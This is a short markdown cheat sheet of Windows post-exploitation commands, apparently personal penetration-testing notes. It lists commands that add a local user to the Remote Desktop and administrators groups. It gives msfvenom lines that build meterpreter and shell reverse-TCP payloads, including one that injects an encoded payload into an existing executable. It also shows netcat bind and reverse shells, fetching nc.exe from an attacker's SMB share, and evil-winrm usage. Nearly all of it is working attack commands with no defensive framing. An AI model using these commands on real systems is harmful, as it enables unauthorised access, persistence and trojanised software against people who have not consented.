## RDP

```
If RDP group exits try to add self to group for rdp
    -Add a user on Windows
        -Command: net user $username $password /add
    -Add a user to RDP Group
        -Command: net localgroup "Remote Desktop Users" $username /add
    -Make a user an administrator
        -net localgroup administrators $username /add
```

## Msfvenom

* Meterpreter

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
```

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

* Non-staged payload (works with nc)

```
msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
```

```
use exploit/multi/handler
set payload windows/shell_reverse_tcp
```

* Staged payload (must be caught with metasploit)

```
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
```

```
use exploit/multi/handler
set payload windows/shell/reverse_tcp
```

* Inject payload into binary

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
```

## Netcat Shell

```
nc.exe -nlvp 4444 -e cmd.exe
nc.exe 192.168.1.101 443 -e cmd.exe

ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
ncat -nv <ip_to_connect> 4444	

If netcat exe cant be located try to host own nc.exe
Command: \\10.10.X.X\\share\nc.exe ****
```

## Evil-winrm

```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
```
